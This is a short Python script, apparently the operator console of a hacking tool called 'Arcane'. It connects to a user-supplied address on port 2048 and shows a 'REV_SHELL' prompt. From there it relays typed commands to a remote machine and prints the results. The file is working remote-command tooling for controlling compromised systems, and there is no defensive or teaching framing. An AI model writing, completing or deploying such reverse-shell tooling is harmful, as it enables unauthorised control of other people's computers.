import socket
import os
from termcolor import colored
from colorama import Fore
nat = input(colored('[#] Enter Your NAT Address: ', 'blue'))
print(colored('[+] Use System Commands Now', 'green'))
hostname = socket.gethostname()
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((nat,2048))
    cmdlet = input(Fore.LIGHTCYAN_EX + hostname + Fore.RESET + '@' + Fore.LIGHTRED_EX + 'Arcane[' + Fore.LIGHTMAGENTA_EX + 'REV_SHELL' + Fore.LIGHTRED_EX + ']' + Fore.GREEN + '$ ' + Fore.LIGHTYELLOW_EX)
    while cmdlet!='quit':
        s.send(cmdlet.encode())
        result = s.recv(2048).decode()
        print(result)
        cmdlet = input(Fore.LIGHTCYAN_EX + hostname + Fore.RESET + '@' + Fore.LIGHTRED_EX + 'Arcane[' + Fore.LIGHTMAGENTA_EX + 'REV_SHELL' + Fore.LIGHTRED_EX + ']' + Fore.GREEN + '$ ' + Fore.LIGHTYELLOW_EX)
        if cmdlet == 'cls':
            os.system('CLS')
        if cmdlet == 'quit':
            s.close()
except:
    print(colored('[!!] Couldnt connect or just error\nTry again', 'red'))
